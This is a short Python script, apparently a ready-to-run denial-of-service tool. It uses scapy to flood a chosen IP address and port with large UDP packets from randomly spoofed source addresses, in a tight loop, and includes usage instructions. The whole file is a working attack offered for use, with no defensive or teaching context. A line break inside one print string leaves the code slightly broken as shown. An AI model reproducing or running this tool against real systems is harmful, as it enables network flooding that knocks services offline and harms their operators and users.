import random
from scapy.all import send, IP, UDP

class UDPFlood:
    def __init__(self, target, port):
        self.target = target
        self.port = port
        self.is_running = True
        self.attack_count = 0

    def udp_gbps(self, payload_size=65535):
        while self.is_running:
            try:
                send(IP(src=f"{random.randint(1, 255)}.{random.randint(1, 255)}.{random.randint(1, 255)}.{random.randint(1, 255)}", dst=self.target) /
                     UDP(sport=random.randint(1, 65535), dport=self.port) /
                     b"X" * payload_size, inter=0.0001)
                self.attack_count += 1
            except Exception as e:
                print(f"Error: {e}")
                pass

    @staticmethod
    def usage():
        print("Usage: python udpgb.py <target_ip> <target_port> [payload_size]")
        print("Example: python udpgb.py 192.168.1.1 80 65535")

if __name__ == "__main__":
    import sys

    if len(sys.argv) < 3:
        UDPFlood.usage()
        sys.exit(1)

    target_ip = sys.argv[1]
    target_port = int(sys.argv[2])
    payload_size = int(sys.argv[3]) if len(sys.argv) > 3 else 65535

    udp_flood = UDPFlood(target_ip, target_port)
    try:
        udp_flood.udp_gbps(payload_size)
    except KeyboardInterrupt:
        print("
Attack stopped by user.")
        print(f"Total packets sent: {udp_flood.attack_count}")